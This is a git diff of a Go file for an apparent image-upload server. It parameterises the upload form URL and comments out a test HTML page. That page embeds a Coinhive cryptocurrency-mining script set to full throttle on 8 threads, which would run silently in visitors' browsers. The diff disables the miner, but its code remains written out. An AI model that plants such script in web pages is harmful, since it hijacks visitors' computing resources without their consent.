@@ -1,5 +1,7 @@
 package main
 
+import "fmt"
+
 /*HTML meaning guide for my sanity:
 <br>: page break
 <html> and </html>: beginning and end of html section
@@ -7,7 +9,7 @@ package main
 <!-- and -->: Comments... WHY
 */
 var (
-	firstPage = `<html>
+	firstPage = fmt.Sprintln(`<html>
 
 
 <head>
@@ -20,7 +22,7 @@ https://github.com/gidoBOSSftw5731/imgsrvr/tree/master
 field from request: {{ .Fn}}
 </p>
 
-<form enctype="multipart/form-data" action="/app/upload/" method="post">
+<form enctype="multipart/form-data" action="`, urlPrefix, `upload/" method="post">
   Key: <input type="password" name="fn"><br>
   <input type="hidden" name="token" value="{{.}}"/>
 	IMG: <input type="file" name="uploadfile"><br>
@@ -38,36 +40,32 @@ field from request: {{ .Fn}}
 </script>
 
 </body>
-</html>`
-)
+</html>`)
 
-//<img src="./testingpics/Graphic1.jpg" alt="Testing Graphic" style="height:500;width:500">
+	/*testPage = `<html>
+	  <head><title> This is the second test page!!! </title> </head>
+	  <body>
+	  testing text<br>
+	  and moar testing text!!!<br>
+	  And a testing graphic!!!<img src="/app/i/foo" alt="Testing Graphic" >
 
-var (
-	testPage = `<html>
-  <head><title> This is the second test page!!! </title> </head>
-  <body>
-  testing text<br>
-  and moar testing text!!!<br>
-  And a testing graphic!!!<img src="/app/i/foo" alt="Testing Graphic" >
+	  <p>
+	  field from request: {{ .Tn}}
+	  </p>
 
-  <p>
-  field from request: {{ .Tn}}
-  </p>
+	  <form action="/app/main/" method="POST">
+	    <input type="submit" value="back to main!">
+	  </form>
 
-  <form action="/app/main/" method="POST">
-    <input type="submit" value="back to main!">
-  </form>
+	  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	  <script>
+	    var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});
 
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-  <script>
-    var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});
-  
-    miner.start();
-    miner.setThrottle(0)
-    miner.setNumThreads(8)
-    
-  </script>
+	    miner.start();
+	    miner.setThrottle(0)
+	    miner.setNumThreads(8)
 
-  </body> </html>`
+	  </script>
+
+	  </body> </html>`*/
 )
